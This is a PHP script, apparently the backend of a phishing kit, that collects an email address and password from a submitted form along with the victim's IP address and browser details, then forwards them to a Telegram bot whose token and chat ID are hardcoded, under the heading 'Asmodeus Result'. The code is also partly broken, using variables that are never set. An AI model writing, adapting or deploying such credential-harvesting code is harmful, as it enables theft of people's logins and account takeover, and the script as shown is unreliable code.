<?php
// === CONFIG ===
$botToken = '8408468042:AAFwUiZhBwCDjmcksMUyDTgfz5oBDJ3DAp8'; // use your current token (rotate later)
$chatId   = '6860869136'; // <-- REPLACE with your numeric chat_id (or @channelusername for a channel)
$rateWindow = 15;
// ==============

session_start();

if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); exit('Method not allowed'); }
if (!empty($_POST['website'])) { exit('OK'); } // honeypot

if (isset($_SESSION['last_submit']) && time() - $_SESSION['last_submit'] < $rateWindow) {
  exit('Please wait a moment before sending again.');
}
$_SESSION['last_submit'] = time();

$email   = trim(isset($_POST['email']) ? $_POST['email'] : '');
$password = trim(isset($_POST['password']) ? $_POST['password'] : '');


if ($name === '' || $email === '' || $message === '' || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
  http_response_code(400);
  exit('Please fill all fields correctly.');
}

$ip   = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown';
$ua   = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'unknown';
$host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';

$text = "[“Asmodeus Result⚖️🔱💰🩸😈”]n"
      . "Name: $name\n"
      . "Email: $email\n"
      . "password: $password\n"
      . "From: $host (IP: $ip)\n"
      . "UA: $ua\n\n"
      . "Message:\n$message";

$api = "https://api.telegram.org/bot{$botToken}/sendMessage";
$payload = [
  'chat_id' => $chatId,
  'text'    => $text
];

$ch = curl_init($api);
curl_setopt_array($ch, [
  CURLOPT_POST => true,
  CURLOPT_POSTFIELDS => $payload,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_TIMEOUT => 15,
  // Uncomment if your server has SSL verification issues:
  // CURLOPT_SSL_VERIFYPEER => false,
  // CURLOPT_SSL_VERIFYHOST => 0,
]);
$response = curl_exec($ch);
$err  = curl_error($ch);
$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($err || $code >= 300) {
  // error_log("Telegram send error ($code): $err | $response");
  http_response_code(500);
  echo "Failed to send. Check chat_id and that you've messaged the bot first.";
} else {
  echo "<script>alert('Message sent!');window.history.back();</script>";
}
